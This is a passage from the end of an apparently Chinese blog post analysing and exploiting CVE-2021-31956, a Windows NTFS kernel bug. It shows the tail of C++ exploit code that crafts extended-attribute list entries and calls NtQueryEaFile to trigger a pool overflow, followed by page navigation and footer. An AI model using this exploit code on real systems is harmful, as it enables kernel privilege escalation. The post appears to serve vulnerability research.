(!pEaListRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		Ulog(<span class="string">&quot;Could not allocate memory for EaList request.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlCopyMemory(pEaListRequest-&gt;EaName, TRIGGER_EA_NAME, TRIGGER_EA_NAME_LENGTH);</span><br><span class="line">	pEaListRequest-&gt;EaNameLength = TRIGGER_EA_NAME_LENGTH;</span><br><span class="line">	pEaListRequest-&gt;NextEntryOffset = (pEaListRequest-&gt;EaNameLength + <span class="number">9</span>) &amp; (~<span class="number">3</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PFILE_GET_EA_INFORMATION pSecondEaListRequest = reinterpret_cast&lt;PFILE_GET_EA_INFORMATION&gt;(reinterpret_cast&lt;PUCHAR&gt;(pEaListRequest) + pEaListRequest-&gt;NextEntryOffset);</span><br><span class="line">	RtlCopyMemory(pSecondEaListRequest-&gt;EaName, OVERFLOW_EA_NAME, OVERFLOW_EA_NAME_LENGTH);</span><br><span class="line">	pSecondEaListRequest-&gt;EaNameLength = OVERFLOW_EA_NAME_LENGTH;</span><br><span class="line">	pSecondEaListRequest-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	EaStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	Status = NtQueryEaFile(hFile, &amp;EaStatusBlock, OutBuffer, KERNEL_ALLOC_SIZE, FALSE, pEaListRequest, <span class="number">100</span>, <span class="number">0</span>, TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Status != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pEaListRequest)</span><br><span class="line">		&#123;</span><br><span class="line">			delete[] pEaListRequest;</span><br><span class="line">			pEaListRequest = nullptr;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Ulog(<span class="string">&quot;Could not Query EA file to trigger the bug with status (%lx).&quot;</span>, Status);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pEaListRequest)</span><br><span class="line">	&#123;</span><br><span class="line">		delete[] pEaListRequest;</span><br><span class="line">		pEaListRequest = nullptr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230927154157158.png" alt="image-20230927154157158"></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/09/01/windows%E6%B1%A0%E9%A3%8E%E6%B0%B4-LFH%E4%BD%8E%E7%A2%8E%E7%89%87%E5%A0%86/" rel="prev" title="windows池风水-LFH低碎片堆">
      <i class="fa fa-chevron-left"></i> windows池风水-LFH低碎片堆
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/09/19/angr%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="angr学习笔记">
      angr学习笔记 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-31956-ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">CVE-2021-31956 ntfs漏洞分析与利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ntfs%E7%BB%84%E4%BB%B6%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">1.ntfs组件介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">2.漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%9E%84%E9%80%A0poc"><span class="nav-number">1.3.</span> <span class="nav-text">2.构造poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">3.漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.4.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Ash</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ash</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
